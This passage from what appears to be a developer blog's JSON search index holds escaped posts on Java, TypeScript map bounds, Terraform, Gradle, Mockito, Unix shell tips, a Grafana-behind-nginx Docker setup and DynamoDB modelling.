2s\n      35s\n      2m 46s\n    \n  \n\n\nTotal\n\n\n\n\n\nJobs\n\n\n    \n    \n    \n    \n    \n    \n    \n    \n    \n\n\nIn the charts separated by job, we can see that the time improvement for test and build comes from using caches. Regarding deploy job, the big improvement comes we have pre-installed aws client provided by the Docker image.\n\n\n\n\n\n"
} ,
  
  {
    "title"    : "Latitude,longitude bounds",
    "category" : "",
    "tags"     : " algorithms, typescript, latlng, maps",
    "url"      : "/bounds-lat-lng-array/",
    "date"     : "April 25, 2020",
    "excerpt"  : "I’m currently developing an application based on maps. In that application I want to represent a set of markers. In order to do so, the map library I’m using it has a fitBounds method. However, you need to compute the bounds of the map that allow ...",
  "content"  : "I’m currently developing an application based on maps. In that application I want to represent a set of markers. In order to do so, the map library I’m using it has a fitBounds method. However, you need to compute the bounds of the map that allow all the markers to be visible. I describe in this article the implemented algorithm.\n\n\n\nAbstraction of latitude longitude\n\nFirst of all, we need to do a nasty approximation. We can represent the earth globe, as a 2-D cartesian axis. In order to do that, we can consider latitude as the y axis and longitude as the x axis.\n\nLongitude will be in range [-180,180] and latitude in the range [-90,90]. We can define the cardinal points in the chart:\n\n\n  North -&amp;gt; Point in (0,90)\n  East -&amp;gt; Point in (180,0)\n  South -&amp;gt; Point in (0,-90)\n  West -&amp;gt; Point in (-180,0)\n\n\nWe can define the bounds of a set of points using two points only: North-East point and South\n\n\n  North-East -&amp;gt; Point in (180,90)\n  South-West -&amp;gt; Point in (-180,-90)\n\n\nWe can see a visual representation of those points in the following chart:\n\n\n\n\n\nTaking this into account we can set up some algorithm to calculate the bounds.\n\nAlgorithm to compute the bounds\n\nThe first basic algorithm is to iterate over all points and compare the longitude (x) and latitude (y) and obtain the point with higher x and y and the point with lower x and y.\n\nconst SW: LatLngTuple = [-90, -180]\nconst NE: LatLngTuple = [90, 180]\nexport const ALL_WORLD_BOUNDS: LatLngBoundsExpression = [NE, SW]\nexport const getBoundsFromPoints = (points: Point[]): LatLngBoundsExpression =&amp;gt; {\n\n    if (points.length === 0)\n        return ALL_WORLD_BOUNDS\n\n    let nex = 0, swx = 0, ney = 0, swy = 0\n    points.forEach((point) =&amp;gt; {\n        if (nex === 0 &amp;amp;&amp;amp; swx === 0 &amp;amp;&amp;amp; ney === 0 &amp;amp;&amp;amp; swy === 0) {\n            nex = swx = point.longitude\n            ney = swy = point.latitude\n        } else {\n            if (point.longitude &amp;gt; nex) nex = point.longitude;\n            if (point.longitude &amp;lt; swx) swx = point.longitude;\n            if (point.latitude &amp;gt; ney) ney = point.latitude;\n            if (point.latitude &amp;lt; swy) swy = point.latitude;\n        }\n    })\n    return [[ney, nex], [swy, swx]]\n}\n\n\nBear in mind that the map library expects and array of [lat,lng], that’s why we are switching the natural order of x,y and we’re using y,x that corresponds to [lat,lng].\n\nUnit test\n\nThese are the unit tests that check this algorithm behaves correctly:\n\nimport {ALL_WORLD_BOUNDS, getBoundsFromPoints} from &quot;./BoundCalculator&quot;;\nimport {Point} from &quot;../../types/Point&quot;;\n\ntest(&quot;should compute bounds of an empty list&quot;, () =&amp;gt; {\n    const bounds = getBoundsFromPoints([])\n    expect(bounds).toEqual(ALL_WORLD_BOUNDS)\n})\n\ntest(&quot;should compute bounds of one point&quot;, () =&amp;gt; {\n    const lat = 1, lng = 1\n    const point = new Point(lat, lng)\n    const bounds = getBoundsFromPoints([point])\n    expect(bounds).toEqual([[lat, lng], [lat, lng]])\n})\n\ntest(&quot;should compute bounds a list of points, each point per quadrant&quot;, () =&amp;gt; {\n    const lat1 = 30, lng1 = 90\n    const lat2 = 30, lng2 = -90\n    const lat3 = -30, lng3 = -90\n    const lat4 = -30, lng4 = 90\n    const point1 = new Point(lat1, lng1)\n    const point2 = new Point(lat2, lng2)\n    const point3 = new Point(lat3, lng3)\n    const point4 = new Point(lat4, lng4)\n    const bounds = getBoundsFromPoints([point1, point2, point3, point4])\n    expect(bounds).toEqual([[lat1, lng1], [lat3, lng3]])\n})\n\n\n\n\n\n\n\n\n"
} ,
  
  {
    "title"    : "Java big memory limit",
    "category" : "",
    "tags"     : " java, jvm, jvmOptions, profiling",
    "url"      : "/java-big-memory-limit/",
    "date"     : "February 3, 2020",
    "excerpt"  : "While at work, we were fine tuning some java application, to do that, we were setting up jvm options, such as -Xmx, -Xms and so on. That lead me to asking me the following question:\n\n\n  What would happen if you start the jvm with the minimum memor...",
  "content"  : "While at work, we were fine tuning some java application, to do that, we were setting up jvm options, such as -Xmx, -Xms and so on. That lead me to asking me the following question:\n\n\n  What would happen if you start the jvm with the minimum memory to be higher than the computer memory?\n\n\n\n\nOur initial assumption is that -Xms will try to reserve the specified amount of memory. If that is bigger than computer memory, the JVM will stop with a OutOfMemoryError and/or the SO will start swapping and of course cause really poor performance.\n\nSetting up\n\nTo answer that question, I prepared a little experiment. A very silly gradle to project that prints something:\n\nhttps://github.com/adriangalera/jvm-big-xms\n\nBasically it runs this dummy code:\n\npublic class Boom {\n  \n    public static void main(String[] args) throws InterruptedException {\n        while (true) {\n            System.out.println(&quot;I&#39;m here&quot;);\n            Thread.sleep(1000);\n        }\n    }\n}\n\nAnd then, generate the jar file:\n./gradlew build\n\n\nFirst experiment\n\nFirst thing to do is run in a controlled environment, let’s say with 2 GB of initial memory:\n\njava -Xms2G -jar build/libs/boom-1.0-SNAPSHOT.jar\n\n\nThe program is responding, the memory profile seems fine; everything works as expected:\n\n\n\nLet’s go wild!\n\nNow, I’ll try with more memory than the available for the computer:\n\njava -Xms100G -jar build/libs/boom-1.0-SNAPSHOT.jar\n\n\nProgram is responding, and checking the memory profile I got a surprise: it is resporting 100GB!\n\n\n\n\n\nAfter some discussion with some collegues, we agreed that this did not explode at the begining because the JVM is using virtual memory. In Linux setup this allocated in 64 bit for userland processes.\n\nThe initial assumption also was wrong about swap, we check swap usage and was completely normal.\n\nTherefore, the JVM does not really reserve the initial memory as it seems initially.\n\nLet’s break it\n\nIf we want to actually pre reserve the memory, there’s a jvm option for that:\n\njava -XX:+AlwaysPreTouch -Xms100g -jar build/libs/boom-1.0-SNAPSHOT.jar \n\n\nExecuting this, the computer will become unusuable because the JVM is taking the whole memory and the SO is taking the rest of the swap disk.\n"
} ,
  
  {
    "title"    : "Lombok tricks",
    "category" : "",
    "tags"     : " java, lombok",
    "url"      : "/lombok-tricks/",
    "date"     : "December 31, 2019",
    "excerpt"  : "\nLombok is this very beatiful tool to reduce the burden of writing Java code, but sometimes it could \nbe hard to tame. In this article I write down some issues and solutions I found while using lombok.\n\n\n\nInmutable objects and Jackson\n\nLet’s say w...",
  "content"  : "\nLombok is this very beatiful tool to reduce the burden of writing Java code, but sometimes it could \nbe hard to tame. In this article I write down some issues and solutions I found while using lombok.\n\n\n\nInmutable objects and Jackson\n\nLet’s say we want to have an inmutable object (@Value) such as:\n\n@Value\n@Builder\npublic class Foo {\n\n    private String id;\n    private String description;\n}\n\n\nIf that’s the structure returned by some API, one could do the following to consume it:\n\nRestTemplate restTemplate = new RestTemplate();\nHttpEntity&amp;lt;String&amp;gt; entity = new HttpEntity&amp;lt;&amp;gt;();\ntry {\n    ResponseEntity&amp;lt;Foo&amp;gt; response = restTemplate.exchange(url HttpMethod.GET, entity,Foo.class);\n    return Optional.ofNullable(response.getBody());\n} catch (Exception ex) {\n    log.error(&quot;Error requesting to API: {}&quot;, ex);\n}\n\n\nHowever, in this case, some exception like the following will be thrown by Jackson JSON deserialization library:\n\nCaused by: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: \nCannot construct instance of `com.gal.Foo` (no Creators, like \ndefault construct, exist): cannot deserialize from Object value \n(no delegate- or property-based Creator)\n\n\nThe solution for this is pretty simple, we need to configure lombok with a private no-arg constructor and a constructor with all arguments:\n\n@Value\n@NoArgsConstructor(force = true, access = AccessLevel.PRIVATE)\n@AllArgsConstructor\n@Builder\npublic class Foo {\n\n    private String id;\n    private String description;\n}\n\n\nThis way, Jackson can deserialize the object with minimal lombok configuration\n"
} ,
  
  {
    "title"    : "Unix useful commands",
    "category" : "",
    "tags"     : " unix, scripting, linux, macosx",
    "url"      : "/unix-useful-commands/",
    "date"     : "November 17, 2019",
    "excerpt"  : "This article is a compilation of Unix useful commands to solve multiple issues found in my career.\n\nEnvironment variables by variable\n\nImage we need to access the contents of an environment variable, but its name is stored in another variable.\n\nFo...",
  "content"  : "This article is a compilation of Unix useful commands to solve multiple issues found in my career.\n\nEnvironment variables by variable\n\nImage we need to access the contents of an environment variable, but its name is stored in another variable.\n\nFor example:\nDEV_AWS_ACCESS_KEY_ID=&quot;1234-dev&quot;\nRD_AWS_ACCESS_KEY_ID=&quot;abcd-prd&quot;\n\nThis could happen for instance while configuring multiple AWS in a CI system.\n\nLet’s continue with the example, the CI system provide a variable called “stage”, which can be dev or prd; then we want to prepend the content of this variable to get the credentials to the proper account:\n\nCUR_ENV=`echo ${stage} | tr a-z A-Z`\nENV_ACCESS_KEY=&quot;${CUR_ENV}_AWS_ACCESS_KEY_ID&quot;\n\n\nNow the magic comes, if this the shell is based in bash, we could the technique called as “variable indirection”, like this:\n\nACTUAL_KEY=echo ${!ENV_ACCESS_KEY}\n\n\nHowever, this will not work on all the shells, a more general solution could be:\n\neval ACTUAL_KEY=\\$$ENV_ACCESS_KEY\n\n\nHowever, there might be security implications by using eval\n\nCheck if there are git changes in script\n\nIn a CI pipeline, you might want to check if there are changes to create an automatic commit, etc.\n\nYou can do that by running the following snippet:\n\ngit diff-index --quiet HEAD\nANY_CHANGE=$?\n[ $ANY_CHANGE -ne 0 ] &amp;amp;&amp;amp; echo &quot;Do something with the change&quot;\n\n\nSee strings in binary file\n\nstrings login.php.swp\n\n"
} ,
  
  {
    "title"    : "Discovering terraform",
    "category" : "",
    "tags"     : " devops, aws, terraform, cloud",
    "url"      : "/discovering-terraform/",
    "date"     : "October 14, 2019",
    "excerpt"  : "Recently I have been playing with Terraform tool and I wrote some basic use cases for the sake of sharing the knowledge\n\n\nWhat is terraform?\n\nImagine you start a new cloud project in AWS. At the very begining, you will write some scripts to genera...",
  "content"  : "Recently I have been playing with Terraform tool and I wrote some basic use cases for the sake of sharing the knowledge\n\n\nWhat is terraform?\n\nImagine you start a new cloud project in AWS. At the very begining, you will write some scripts to generate your AWS resources:\n\n\n  DynamoDB tables\n  S3 buckets\n  RDS databases\n  …\n\n\nHowever, lots of configuration are required to make it work properly, i.e. IAM roles, ARN of resources, etc… So, managing this burden manually or with some scripts rapidly could become an issue.\n\nEven worst, imagine you have resources in both Google Cloud an AWS. The amount of scripts will be doubled as well as the issues.\n\nTerraform was created to help with those issues. It is a tool written in Go language that enables managing the state of cloud infrastructure from configuration files with its own Domain Specific Language (DSL).\n\nFurthermore, it is a handy tool to define the infrastructure as code. In this approach the changes to the infrastructure can be pushed to a git repository for instance; this way the changes can be reviewed, etc.\n\nAnother fancy feature is that it keeps the state of the resources running in Cloud. This way terraform allows to make incremental changes (if possible).\n\nBasic usage\n\nThere are three main commands to use:\n\n\n  terraform plan: process the configuration templates and present in stdout the actions that will be applied\n  terraform apply: process the configuration templates and apply the required actions\n  terraform destroy: process the configuration templates and delete the resources\n\n\nScenarios\n\nIn this section, I prepared 4 scenarions to show some cool features that terraform can provide.\n\nBasic\n\nThis scenario create a DynamoDB table and an S3 bucket. There’s nothing fancy here, only basic usage of terraform:\n\nvariable &quot;app-prefix&quot; {\n  type = string\n  default = &quot;comms-ks-01&quot;\n}\nresource &quot;aws_dynamodb_table&quot; &quot;configuration&quot; {\n  name           = &quot;${var.app-prefix}_timeserie_configuration&quot;\n  billing_mode   = &quot;PAY_PER_REQUEST&quot;\n  hash_key       = &quot;timeserie1&quot;\n\n  attribute {\n    name = &quot;timeserie1&quot;\n    type = &quot;S&quot;\n  }\n\n}\nresource &quot;aws_s3_bucket&quot; &quot;s3-bucket-rnd-name&quot; {\n    bucket = &quot;${var.app-prefix}-timeserie-configuration&quot;\n} \noutput &quot;bucket-arn&quot; {\n  value = &quot;${aws_s3_bucket.s3-bucket-rnd-name.arn}&quot;\n}\n\nThe template defines a variable (“app-prefix), a DynamoDB table (“configuration”) and a S3 bucket (“s3-bucket-rnd-name”). The last line defines to output to print the ARN of the created bucket\n\nFor each\n\nIn this scenario, the requirement is to create three tables with similar names. In order to reuse the code, we can use terraform’s for-each statement:\n\nresource &quot;aws_dynamodb_table&quot; &quot;configuration&quot; {\n\n  for_each = {\n    test1: &quot;${var.app-prefix}_configuration_test_1&quot;,\n    test2: &quot;${var.app-prefix}_configuration_test_2&quot;,\n    test3: &quot;${var.app-prefix}_configuration_test_3&quot;,\n  }\n\n  name           = each.value\n  billing_mode   = &quot;PAY_PER_REQUEST&quot;\n  hash_key       = &quot;timeserie&quot;\n\n  attribute {\n    name = &quot;timeserie&quot;\n    type = &quot;S&quot;\n  }\n}\n\nThis way with only one resource definition, we can create multiple resources.\n\nLinking resources\n\nUp to here, we haven’t done anything fancy, just creating resources. However, we can create more interesting environments, such as a serverless pipeline to process a file:\n\n\n\n# Lambda definition\nresource &quot;aws_lambda_function&quot; &quot;download-s3-lambda&quot; {\n  filename      = &quot;download-s3-file-lambda.zip&quot;\n  function_name = &quot;${var.app-prefix}-download-files-lambda&quot;\n  role          = &quot;${aws_iam_role.iam_for_lambda.arn}&quot;\n  handler       = &quot;receive-file-s3.handler&quot;\n  runtime       = &quot;python3.7&quot;\n  depends_on    = [&quot;aws_iam_role_policy_attachment.lambda_logs&quot;, &quot;aws_cloudwatch_log_group.example&quot;]\n}\n\n# Notify lambda when a file is created in the S3 bucket\nresource &quot;aws_s3_bucket_notification&quot; &quot;bucket_notification&quot; {\n  bucket = &quot;${aws_s3_bucket.s3-files-bucket.id}&quot;\n\n  lambda_function {\n    lambda_function_arn = &quot;${aws_lambda_function.download-s3-lambda.arn}&quot;\n    events              = [&quot;s3:ObjectCreated:*&quot;]\n  }\n}\n# S3 bucket to place files\nresource &quot;aws_s3_bucket&quot; &quot;s3-files-bucket&quot; {\n    bucket = &quot;${var.app-prefix}-files-bucket&quot;\n    force_destroy = &quot;true&quot;\n}\n\nThe template in this environment is more complex, because there’s a lot of IAM permissions in place. For simplicity, not all the resources are included in this article. For more info: https://github.com/adriangalera/terraform-knowledge-sharing.\n\nIn the upper code snippet can be observed how the AWS lambda and the AWS S3 bucket are created. Additionally, the notification from S3 to Lambda is created. When an object is created  in the S3 bucket, the AWS lambda will be invoked.\n\nTemplates\nTerraform also supports templates to enable code reuse. In this environment, we will create two docker container to be ran on ECS. Those two docker containers will execute the same image and echo the value of an environment variable.\n\nIf we did not have templates, we would need to define the resources twice. Thanks to the templates, we don’t need to define the container definition twice, we only need to pass the variables.\n\ndata &quot;template_file&quot; &quot;container_backend&quot; {\n  template = &quot;${file(&quot;container_definition.tpl&quot;)}&quot;\n  vars = {\n    container_name = &quot;${var.app-prefix}_backend_container&quot;\n    log_group = &quot;${var.app-prefix}_backend_container&quot;\n    service_type = &quot;backend&quot;\n  }\n}\n  family = &quot;${var.app-prefix}_backend_task_definition&quot;\n  requires_compatibilities = [ &quot;FARGATE&quot; ]\n  network_mode =  &quot;awsvpc&quot;\n  execution_role_arn = &quot;${aws_iam_role.ecs_container_iam_role.arn}&quot;\n  cpu = 256\n  memory = 512\n  container_definitions = &quot;${data.template_file.container_backend.rendered}&quot;\n}\n\nIn order to get the rendered values of the template, we need to get the rendered field.\n\nIn this case, the template contains lots of configuration and IAM definitions. For more info, check the whole repository: https://github.com/adriangalera/terraform-knowledge-sharing\n"
} ,
  
  {
    "title"    : "Mockito ArgumentCaptor with inheritance",
    "category" : "",
    "tags"     : " testing, java, mockito",
    "url"      : "/mockito-argumentcaptor-inheritance/",
    "date"     : "August 8, 2019",
    "excerpt"  : "Working with Mockito’s ArgumentCaptor I discover it has a awful issue with inheritance.\n\nLet’s suppose we have a parent class named Animal and two child classes Dog and Cat:\n\npublic class Animal {\n\n    private String species;\n\n    public Animal(St...",
  "content"  : "Working with Mockito’s ArgumentCaptor I discover it has a awful issue with inheritance.\n\nLet’s suppose we have a parent class named Animal and two child classes Dog and Cat:\n\npublic class Animal {\n\n    private String species;\n\n    public Animal(String species) {\n        this.species = species;\n    }\n\n    public String getSpecies() {\n        return species;\n    }\n}\npublic class Cat extends Animal {\n\n    private final String colorEyes;\n\n    public Cat(String colorEyes) {\n        super(&quot;Cat&quot;);\n        this.colorEyes = colorEyes;\n    }\n}\npublic class Dog extends Animal {\n\n    private String name;\n\n    public Dog(String name) {\n        super(&quot;Dog&quot;);\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n}\n\n\nAnd a class that accept an argument of type Animal:\npublic class AnimalProcessor {\n\n    public void processAnimal(Animal animal) {\n        System.out.println(animal.getSpecies());\n    }\n}\n\n\nOne might think on writing the unit test of AnimalProcessor similar to this snippet:\n\npublic class ArgumentCaptorInheritanceTest {\n\n    @Mock\n    private AnimalProcessor animalProcessor;\n\n    @Before\n    public void init() {\n        MockitoAnnotations.initMocks(this);\n    }\n\n    @Test\n    public void shouldProcessDog() {\n        Dog dog = new Dog(&quot;Rex&quot;);\n        Cat cat = new Cat(&quot;blue&quot;);\n\n        ArgumentCaptor&amp;lt;Dog&amp;gt; dogArgumentCaptor = ArgumentCaptor.forClass(Dog.class);\n\n        animalProcessor.processAnimal(dog);\n        animalProcessor.processAnimal(cat);\n\n        Mockito.verify(animalProcessor).processAnimal(dogArgumentCaptor.capture());\n\n        Assert.assertEquals(&quot;Rex&quot;, dogArgumentCaptor.getValue().getName());\n    }\n\n\nWell, this fails … ArgumentCaptor does not work well in this case. It makes the verify fail because the method has been called twice.\n\nThe expected behaviour is that only verify analyses the calls when the Dog instance is passed.\n\nIn order to execute the test in this way, some ugly workaround needs to be done:\n\n    @Test\n    public void shouldProcessDog() {\n        Dog dog = new Dog(&quot;Rex&quot;);\n        Cat cat = new Cat(&quot;blue&quot;);\n\n        ArgumentCaptor&amp;lt;Animal&amp;gt; animalCaptor = ArgumentCaptor.forClass(Animal.class);\n\n        animalProcessor.processAnimal(dog);\n        animalProcessor.processAnimal(cat);\n\n        Mockito.verify(animalProcessor, Mockito.times(2)).processAnimal(animalCaptor.capture());\n\n        List&amp;lt;Animal&amp;gt; processedAnimals = animalCaptor.getAllValues();\n        Optional&amp;lt;Animal&amp;gt; dogOptional = processedAnimals.stream()\n                                        .filter(a -&amp;gt; a instanceof Dog)\n                                        .findFirst();\n        Assert.assertTrue(dogOptional.isPresent());\n        Assert.assertEquals(&quot;Rex&quot;, ((Dog) dogOptional.get()).getName());\n    }\n\n\nInstead of capturing the arguments for Dog, you can do it for Animal.\n\nThen the verify will successfully capture the two calls and then all the captured values can be analysed. You can filter the captured values for the objects that are of the interested instance.\n\nThis example comes from:\n\nhttps://github.com/adriangalera/java-sandbox/tree/master/src/test/java/mockito/argcaptor\n\nThis is a known issue (already reported as an issue in their repo):\n\nhttps://github.com/mockito/mockito/issues/565\n\nAs of the day of writing the article, the issues is still there and it has been opened from 2016 …\n"
} ,
  
  {
    "title"    : "Publishing versions in Gradle BOM",
    "category" : "",
    "tags"     : " gradle, groovy",
    "url"      : "/gradle-bom-publish-dependency-version/",
    "date"     : "July 18, 2019",
    "excerpt"  : "We are planning to use the concept of Bill Of Materials (BOM) to define the version of our dependencies. However this externalization do not allow us to have the version variable in the projects that import the bom. Here you will find out how we m...",
  "content"  : "We are planning to use the concept of Bill Of Materials (BOM) to define the version of our dependencies. However this externalization do not allow us to have the version variable in the projects that import the bom. Here you will find out how we managed to get the version in our components.\n\nBill of Materials\nEveryone knows dependencies are hell, specially dealing with versions. That’s why we want to centralize all the version definition in a Bill Of Materials file. This approach is used for instance by Spring framework.\n\nHowever in our projects we need to provide the current version of libraries for some external component configuration.\n\nIn this sense, the two requirements collide because the versions cannot be extracted from the bom file.\n\nPublishing the versions\n\nHere’s our bom gradle script:\n\nplugins {\n    id &#39;java&#39;\n    id &#39;maven-publish&#39;\n    id &#39;io.spring.dependency-management&#39; version &#39;1.0.6.RELEASE&#39;\n}\n\ngroup &#39;com.example&#39;\n\ndef versions = [\n        library1: &#39;5.14.13&#39;,\n        library2: &#39;1.0.6.RELEASE&#39;,  \n]\n\n\ndependencyManagement {\n    dependencies {\n        dependency group: &#39;com.example&#39;, name: &#39;library1&#39;, version: versions.library1\n        dependency group: &#39;com.example&#39;, name: &#39;library2&#39;, version: versions.library2    \n    }\n}\n\npublishing {\n    repositories {\n        maven {\n            url &#39;https://repo.com/maven-releases&#39;\n            credentials credentials\n        }\n    }\n\n    publications {\n        mavenBom(MavenPublication) {\n            artifacts = []\n        }\n    }\n}\n\n\nWhen we execute the publish it correctly generates the bom file. However the versions are not accesible from the projects that import the bom.\n\nIn order to extract the version, we can add it as properties to the bom file:\n\n publications {\n        mavenBom(MavenPublication) {\n            artifacts = []\n            pom.withXml {\n                def propertiesNode = new Node(null, &quot;properties&quot;)\n                versions.each { entry -&amp;gt; propertiesNode.appendNode(entry.key, entry.value) }\n                asNode().append(propertiesNode)\n            }\n        }\n    }\n\n\nIt took like 3 hours to get these 3 lines working because Groovy sucks … After that we get the versions in the pom.xml:\n\n&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;\n&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&amp;gt;\n  &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;\n  ...\n  &amp;lt;properties&amp;gt;\n    &amp;lt;library1&amp;gt;5.14.13&amp;lt;/library1&amp;gt;\n    &amp;lt;library2&amp;gt;1.0.6.RELEASE&amp;lt;/library2&amp;gt;\n  &amp;lt;/properties&amp;gt;\n&amp;lt;/project&amp;gt;\n\n\n\nFrom the project that want to use the bom we can access these versions like this:\n\ndependencyManagement.importedProperties[&#39;library1&#39;]\n\n"
} ,
  
  {
    "title"    : "Java Unit Test to check UTF-8 chars",
    "category" : "",
    "tags"     : " java, unit-test, utf8, i18n",
    "url"      : "/java-test-utf8/",
    "date"     : "June 19, 2019",
    "excerpt"  : "During a migration to a new plattform, we have detected an issue with the character encoding. Some of the messages contained the UTF-8 replacement character (�)\n\n\n\nFortunately, we have been able to fix the configuration issue and to make sure it d...",
  "content"  : "During a migration to a new plattform, we have detected an issue with the character encoding. Some of the messages contained the UTF-8 replacement character (�)\n\n\n\nFortunately, we have been able to fix the configuration issue and to make sure it does not happen again we have put in place a variation of the following unit test:\n\nimport org.junit.Assert;\nimport org.junit.Test;\n\npublic class CheckUtf8ReplacementChar {\n\n\n    private boolean containsUtf8ReplacementCharacter(String target) {\n        final int REPLACEMENT_CHARACTER_VALUE = 65533;\n        for (int i = 0; i &amp;lt; target.length(); i++) {\n            if ((int) target.charAt(i) == REPLACEMENT_CHARACTER_VALUE) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    @Test\n    public void shouldDetectUtf8ReplacementChar() {\n        final String wrongString = &quot;Wrong characters ������������������&amp;lt;br&amp;gt;&quot;;\n        final String okString = &quot;OK characters&quot;;\n        Assert.assertTrue(containsUtf8ReplacementCharacter(wrongString));\n        Assert.assertFalse(containsUtf8ReplacementCharacter(okString));\n    }\n}\n\n\nEven though this can be improved, we didn’t have much time to think about it. That’s the first way we could develop.\n"
} ,
  
  {
    "title"    : "Grafana, nginx reverse-proxy and Docker",
    "category" : "",
    "tags"     : " grafana, docker, devops, nginx",
    "url"      : "/grafana-nginx-reverse-proxy-docker/",
    "date"     : "June 15, 2019",
    "excerpt"  : "We want to start monitoring our AWS resources using Cloudwatch. The API is awesome, however its visualisation tool sucks, that&#39;s why we choose Grafana to present the data.\n\nCurrently, we&#39;re using ECS to deploy our services and Grafana is available...",
  "content"  : "We want to start monitoring our AWS resources using Cloudwatch. The API is awesome, however its visualisation tool sucks, that&#39;s why we choose Grafana to present the data.\n\nCurrently, we&#39;re using ECS to deploy our services and Grafana is available as a Docker image therefore this tool is a natural fit! We checked the documentation and everything looks fine: https://grafana.com/docs/installation/docker\nThe problem comes when we tried to deploy Grafana docker image using our governance tool. This tool expects a /health-check endpoint to detect the status of our applications. Here we have two approaches:\n\nTry to modify the Grafana code to add this logic inside\nAdd something to the Docker container to answer this endpoint.\n\nFor obvious reasons we chose the second version. Initially we were thinking on some kind of script. However we realised that the requests to Grafana need to be proxied. This is even mentioned in their documentation! https://grafana.com/docs/installation/behind_proxy/ .\nThe solution\nNow that we have discarded the scripting, we chose nginx to implement the reverse proxy and we delegate the health-check endpoint to a static content under webroot of nginx.\nHereunder is the Dockerfile, which is self-explanatory:\n\nFROM grafana/grafana\nEXPOSE 8080 8080\nCOPY health-check /health-check\nCOPY start-nginx-grafana.sh /start-nginx-grafana.sh\nUSER root\nRUN apt-get update &amp;amp;amp;&amp;amp;amp; apt-get install -y nginx\nRUN chown -R grafana:grafana /etc/nginx/nginx.conf /var/log/nginx /var/lib/nginx /start-nginx-grafana.sh\nRUN chmod +x /start-nginx-grafana.sh\nUSER grafana\nRUN cp /health-check/nginx.conf /etc/nginx/nginx.conf\nENTRYPOINT [ &quot;/start-nginx-grafana.sh&quot; ]\n\n\nThe tricky part we found was that installing nginx required sudo permissions, however this could be easily achieved changing to the user root in the Dockerfile. Grafana service runs as grafana user, so, some permissions of files and folders of the nginx services need to be changed to the grafana user.\nThe following snippet shows the nginx.conf file:\n\nworker_processes  1;\npid /var/lib/nginx/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       8080;\n        server_name  localhost;\n\n        location /health-check {\n            default_type  &quot;application/json&quot;;\n            root   /health-check;\n            index  health-check.json;\n        }\n\n        location / {\n            proxy_pass http://localhost:3000/;\n        }\n\n        #location /api {\n        #    return 403;\n        #}\n    }\n}\n\n\nThis configuration enables the health-check endpoint to be compatible with our governance tool. Precisely nginx returns the file health-check.json in response to this endpoint. nginx proxies any other request to the Grafana instance running inside the container. The presence of the nginx reverse proxy enables the user to implement more features, like blocking the Grafana API, etc...\nYou can check the code to provide Grafana,nginx and Docker here: https://github.com/adriangalera/nginx-grafana-docker\n"
} ,
  
  {
    "title"    : "Parse huge local json file",
    "category" : "",
    "tags"     : " frontend, react, json, oboejs",
    "url"      : "/parse-huge-local-json-file/",
    "date"     : "March 13, 2019",
    "excerpt"  : "I need to provide a UI to analyse the results of a long-running process that generates huge JSON file whose size is in GB order.\nIn the article I will talk about the solution implemented using the HTML5 FileReader API and the mighty oboe.js librar...",
  "content"  : "I need to provide a UI to analyse the results of a long-running process that generates huge JSON file whose size is in GB order.\nIn the article I will talk about the solution implemented using the HTML5 FileReader API and the mighty oboe.js library\n\nTL;DR: The code\nThanks to HTML5 FileReader API , files can be read locally in the browser without any need for servers. Even better, files can be read in chunks in order to keep the memory footprint as low as desired.\nIf you search in Google about how to parse huge JSON files, eventually the streaming techniques will appear. In the XML world there are two different techniques for parsing files:\n\nSAX: Read the XML as events, keeping a little memory footprint\nDOM: Read the whole XML in memory allowing easy manipulation\n\nWorking with JSON the DOM technique is the most used. For instance &quot;JSON.parse&quot; loads the whole string in memory before parsing the JSON. What will happen if the string is really big? The browser will explode.\nWe need to apply the SAX loading technique to read the big JSON file. In order to achieve that we can use Oboejs library:\nOboe.js is an open source Javascript library for loading JSON using streaming, combining the convenience of DOM with the speed and fluidity of SAX.\nUsing oboe.js\nReading the documentation it is not clear if one can use the FileReader API with oboe-js. It clearly says you can pass an URL or a NodeJs stream to its initializer method:\n\noboe( String url )\n\noboe({\n    url: String,\n    method: String,\n    headers: Object,\n    body: String|Object,\n    cached: Boolean,\n    withCredentials: Boolean\n})\n\noboe(stream)\n\n\nSearching over the internet I have found this Github issue where it&#39;s author is asking for some solution to not using an URL nor NodeJs stream.\nSo, finally there&#39;s a way to combine the power of the FileReader API and the streaming capabilities of oboejs\nThe code\nSince the UI we are building is built in React, I have made this project as a plug-and-play React component:\nhttps://github.com/adriangalera/parse-huge-json\nP.S: The plug-and-play worked like a charm!\n&amp;nbsp;\n"
} ,
  
  {
    "title"    : "Relational model in DynamoDB",
    "category" : "",
    "tags"     : " aws, cloud, dynamodb, relational, persistence, ecs, python",
    "url"      : "/relational-model-dynamodb/",
    "date"     : "January 28, 2019",
    "excerpt"  : "For a new project that I am starting, I have the requirement to implement a highly relational model in AWS. The most important condition is to keep costs as low as possible, since this is a personal project and I do not want to get poor.\nTherefore...",
  "content"  : "For a new project that I am starting, I have the requirement to implement a highly relational model in AWS. The most important condition is to keep costs as low as possible, since this is a personal project and I do not want to get poor.\nTherefore I will persist the model in DynamoDB configured to use the minimum resources as possible.\n\nThe application consist on three entities: User,Map and Points.\nUsers can create multiple maps that contain several points. The following UML schema explain the relationships:\n\n  \nRelational model UML\n\nDynamoDB is a key-value store with support for range key. Thanks to that I am able to implement the following queries:\n\n\n  CRUD User,Map,Point\n  Add a map for one user\n  Add a point in a map\n  Get points from a map\n  Remove map from user\n  Remove point from user\n  Get maps for a user\n\n\nThe DynamoDB model\nUsers table\nThe user table is straightforward, the only key is a unique identifier for the user.\n\n{\n    &quot;TableName&quot;: USER_TABLE,\n    &quot;KeySchema&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;user_id&quot;,\n            &quot;KeyType&quot;: &quot;HASH&quot;\n        }\n    ],\n    &quot;AttributeDefinitions&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;user_id&quot;,\n            &quot;AttributeType&quot;: &quot;S&quot;\n        }\n    ]\n}\n\n\nThere are additional attributes that keep track of the number of points and maps stored 